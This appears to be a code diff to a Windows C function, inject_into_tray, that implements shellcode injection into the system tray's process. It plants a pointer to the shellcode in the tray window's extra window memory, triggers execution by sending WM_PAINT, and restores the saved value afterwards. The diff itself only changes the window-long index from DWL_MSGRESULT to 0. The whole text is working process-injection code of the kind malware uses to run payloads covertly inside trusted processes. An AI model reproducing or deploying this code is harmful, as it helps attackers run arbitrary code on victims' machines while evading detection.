@@ -75,7 +75,7 @@ bool inject_into_tray(LPBYTE shellcode, SIZE_T shellcodeSize)
     GetWindowThreadProcessId(hWnd, &pid);
     printf("PID:\t%p\n", pid);
    //save the current value, because we will need to recover it:
-    LONG winLong = GetWindowLongW(hWnd, DWL_MSGRESULT);
+    LONG winLong = GetWindowLongW(hWnd, 0);
     printf("WindowLong:\t%p\n", winLong);
 
     HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, false, pid);
@@ -92,7 +92,7 @@ bool inject_into_tray(LPBYTE shellcode, SIZE_T shellcodeSize)
     printf("Saving handles to:\t%p\n", remote_handles_ptr);
 
     //set the handle to the injected:
-    SetWindowLong(hWnd, DWL_MSGRESULT, (LONG) remote_handles_ptr);
+    SetWindowLong(hWnd, 0, (LONG) remote_handles_ptr);
 
     //send signal to execute the injected code
     SendNotifyMessage(hWnd, WM_PAINT, 0, 0);
@@ -101,12 +101,12 @@ bool inject_into_tray(LPBYTE shellcode, SIZE_T shellcodeSize)
     //in order to avoid repetitions, injected code should restore the previous value after the first exection
     //here we are checking if it is done
     size_t max_wait = 5;
-    while (GetWindowLong(hWnd, DWL_MSGRESULT) != winLong) {
+    while (GetWindowLong(hWnd, 0) != winLong) {
         //not restored, wait more
         Sleep(100);
         if ((max_wait--) == 0) {
             //don't wait longer, restore by yourself
-            SetWindowLong(hWnd, DWL_MSGRESULT, winLong);
+            SetWindowLong(hWnd, 0, winLong);
             SendNotifyMessage(hWnd, WM_PAINT, 0, 0);
         }
     }    
